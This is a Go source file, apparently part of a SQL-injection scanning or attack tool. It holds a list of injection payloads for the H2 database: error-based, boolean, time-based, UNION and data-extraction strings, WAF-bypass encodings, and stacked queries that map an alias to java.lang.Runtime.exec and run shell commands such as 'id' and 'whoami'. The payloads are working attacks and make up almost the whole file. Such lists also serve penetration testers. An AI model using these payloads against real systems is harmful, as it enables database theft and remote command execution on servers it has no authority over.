package payloads

// H2 db (Java-based, also covers HSQLDB/Hybrid)
var H2 = PayloadGroup{
	DBMS: "H2",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=CAST(CURRENT_DATE AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(CURRENT_TIME AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(CURRENT_TIMESTAMP AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(USER() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(DATABASE() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 1) AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS LIMIT 1) AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=X'00'--"}, // H2-specific: invalid hex

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 2)--", Expected: "false"},
		{Type: "boolean", Content: "') AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') AND 1=2--", Expected: "false"},

		// ═══════════════════════════════════════════
		// TIME-BASED (H2: SLEEP via function alias)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "' AND SLEEP(5)--"},
		{Type: "time", Content: "'; CALL SLEEP(5)--"},
		{Type: "time", Content: "' UNION SELECT SLEEP(5)--"},
		{Type: "time", Content: "') AND SLEEP(5)--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' UNION SELECT 1--"},
		{Type: "union", Content: "' UNION SELECT 1,2--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3,4--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT TABLE_SCHEMA||'.'||TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"},
		{Type: "deep", Content: "' UNION SELECT COLUMN_NAME||':'||DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='USERS'--"},
		{Type: "deep", Content: "' UNION SELECT H2VERSION()--"},
		{Type: "deep", Content: "' UNION SELECT DATABASE()--"},
		{Type: "deep", Content: "' UNION SELECT USER()--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_SCHEMA()--"},

		// ═══════════════════════════════════════════
		// STACKED QUERIES
		// ═══════════════════════════════════════════
		{Type: "stacked", Content: "'; CREATE ALIAS IF NOT EXISTS SHELLEXEC FOR \"java.lang.Runtime.exec\";--"},
		{Type: "stacked", Content: "'; CALL SHELLEXEC('id')--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
		{Type: "bypass", Content: "'%0AOR%0A1=1--"},
		{Type: "bypass", Content: "'%0AAND%0A1%3D1--"},
		{Type: "bypass", Content: "'%09UNION%09SELECT%091--"},
		{Type: "bypass", Content: "'%2F**%2FOR%2F**%2F1%3D1--"},
		{Type: "bypass", Content: "'%0AUNION%0ASELECT%0ANULL--"},
		{Type: "time", Content: "1' AND SLEEP(5)--"},
		{Type: "time", Content: "\" AND SLEEP(5)--"},
		{Type: "time", Content: "' AND SLEEP(3)--"},
		{Type: "time", Content: "' AND SLEEP(8)--"},
		{Type: "time", Content: "1') AND SLEEP(5)--"},
		{Type: "time", Content: "' OR SLEEP(5)--"},
		{Type: "union", Content: "\" UNION SELECT 1,2--"},
		{Type: "union", Content: "' UNION SELECT NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"},
		{Type: "union", Content: "') UNION SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION ALL SELECT 1,2,3,4,5--"},
		{Type: "boolean", Content: "\" AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "\" AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "\") AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "\") AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' OR 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 2)", Expected: "false"},
		{Type: "error", Content: "' AND 1=CAST(COALESCE((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 1),'x') AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(COALESCE((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS LIMIT 1),'x') AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(SESSION_ID() AS SIGNED)--"},
		{Type: "error", Content: "' AND 1=CAST(SCRIPT() AS SIGNED)--"},
		{Type: "deep", Content: "' UNION SELECT TABLE_SCHEMA||'.'||TABLE_NAME||'.'||COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS ORDER BY 1--"},
		{Type: "deep", Content: "' UNION SELECT COLUMN_NAME||':'||DATA_TYPE||':'||CHARACTER_MAXIMUM_LENGTH FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='USERS'--"},
		{Type: "deep", Content: "' UNION SELECT TABLE_SCHEMA||'.'||TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA!='INFORMATION_SCHEMA'--"},
		{Type: "deep", Content: "' UNION SELECT CURRENT_USER()--"},
		{Type: "stacked", Content: "'; CREATE ALIAS IF NOT EXISTS REVERSE_CMD FOR \"java.lang.Runtime.getRuntime().exec\";--"},
		{Type: "stacked", Content: "'; CALL REVERSE_CMD('whoami')--"},
		{Type: "stacked", Content: "'; SELECT 1; DROP ALIAS IF EXISTS REVERSE_CMD;--"},
	},
}

